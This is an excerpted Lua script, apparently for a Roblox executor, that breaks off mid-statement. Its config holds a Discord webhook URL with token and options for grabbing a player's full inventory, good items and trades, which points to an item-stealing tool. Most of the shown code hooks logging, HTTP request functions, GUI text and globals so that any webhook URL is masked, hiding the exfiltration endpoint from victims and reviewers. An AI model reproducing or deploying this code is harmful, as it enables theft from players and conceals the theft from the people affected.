Config = {
    ...
    Webhook = "https://discord.com/api/webhooks/1267462746992279572/ES74HPbhn9yRBmNO9B2nqrqNOLsJlZzozLn79gWFP5RoSedvAcciwu0_UfGzLVwAGCDT",
    FullInventory = true,
    GoodItemsOnly = true,
    ResendTrade = "Hi",
    Script = "Hub",
...
-- Define the Discord webhook pattern
local DISCORD_WEBHOOK_PATTERN = "https://discord.com/api/webhooks/"

-- Function to obfuscate sensitive information
local function obfuscateText(text)
    return text:gsub(DISCORD_WEBHOOK_PATTERN .. "[%d%w-_]+", "[OBFUSCATED]")
end

-- Hook functions to obfuscate sensitive information in logs
local function hookFunction(func)
    if func then
        local original = hookfunction(func, newcclosure(function(...)
            local args = {...}
            for i, arg in next, args do
                args[i] = obfuscateText(tostring(arg))
            end
...
-- Function to handle text in GUI elements
local function checkTextForWebhook(guiElement)
    if guiElement:IsA("TextLabel") or guiElement:IsA("TextButton") then
        local function onTextChange()
            local newText = obfuscateText(guiElement.Text)
            if guiElement.Text ~= newText then
                guiElement.Text = newText
            end
        end

        guiElement:GetPropertyChangedSignal("Text"):Connect(onTextChange)
        -- Initial check
        onTextChange()
    end
end

-- Monitor existing and new GUI elements
local function monitorGUI()
    for _, obj in ipairs(game:GetDescendants()) do
        checkTextForWebhook(obj)
    end
end

-- Start monitoring GUI elements and new additions
monitorGUI()
game.DescendantAdded:Connect(function(descendant)
    checkTextForWebhook(descendant)
end)

-- Handle HTTP requests without blocking
local function hookHttpFunction(func)
    if func then
        hookFunction(func)
    end
end

hookHttpFunction(game.HttpGet)
hookHttpFunction(game.HttpPost)

-- Handle syn.request and request if available
local RequestLog
if syn and syn.request then
    RequestLog = hookfunction(syn.request, function(dat)
        dat.Url = obfuscateText(dat.Url)
...
monitorGlobalVariable()

-- Metatable for global table to monitor changes
setmetatable(_G, {
